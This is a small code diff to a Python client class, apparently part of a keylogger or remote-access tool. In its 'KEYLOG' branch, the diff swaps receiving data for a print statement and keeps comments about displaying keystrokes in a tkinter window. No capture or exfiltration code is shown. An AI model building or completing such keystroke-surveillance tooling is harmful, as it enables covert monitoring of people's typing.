@@ -114,7 +114,8 @@ class Client:
             print("Done")
                
         elif res == "KEYLOG":
-            data = self.receive_data()
+            print(res)
+            # data = self.receive_data()
             # self.gui.keystrokeScene
             # gui.GUI.keystrokeScene
             # Display data in a tkinter widget
